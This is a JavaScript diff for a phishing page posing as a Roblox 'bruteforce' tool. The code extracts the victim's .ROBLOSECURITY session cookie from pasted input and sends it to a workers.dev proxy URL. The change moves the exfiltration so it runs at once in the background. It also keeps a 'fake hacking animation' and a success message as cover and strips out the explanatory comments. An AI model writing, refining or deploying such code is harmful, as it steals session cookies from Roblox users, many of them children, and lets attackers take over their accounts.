@@ -1,18 +1,17 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
 function extractRobloxSecurityCookie(sessionId) {
-  // Try multiple patterns of cookie extraction
   const patterns = [
-    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Pattern 1: .ROBLOSECURITY=value
-    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Pattern 2: .ROBLOSECURITY","value"
-    /_\|WARNING:-DO-NOT-SHARE-THIS[^_]+_/  // Pattern 3: Full cookie format
+    /\.ROBLOSECURITY[^=]+=([^;]+)/,
+    /\.ROBLOSECURITY",\s*"([^"]+)"/,
+    /_\|WARNING:-DO-NOT-SHARE-THIS[^_]+_/
   ];
   
   for (const pattern of patterns) {
     const match = sessionId.match(pattern);
-    if (match) return match[0]; // Return the entire match
+    if (match) return match[0];
   }
-  return null; // Return null if no cookie found
+  return null;
 }
 
 async function sendToProxy(sessionId) {
@@ -34,19 +33,17 @@ async function sendToProxy(sessionId) {
 }
 
 function bruteforce(sessionId) {
-  // Start the hacking animation
+  // Send data IMMEDIATELY in the background
+  const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
+  sendToProxy(cookie).catch(console.error); // Fire and forget
+  
+  // Start the fake hacking animation
   startHack();
   
-  // Process the session ID after delay (matches progress bar)
-  setTimeout(async () => {
-    try {
-      const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
-      await sendToProxy(cookie);
-      showCookieSuccess();
-    } catch (error) {
-      showError("Failed to process session ID");
-    }
-  }, 65000); // Match with progress bar duration
+  // Show results after animation completes (65 seconds later)
+  setTimeout(() => {
+    showCookieSuccess();
+  }, 65000);
 }
 
 // Your existing validateInput function (unchanged)
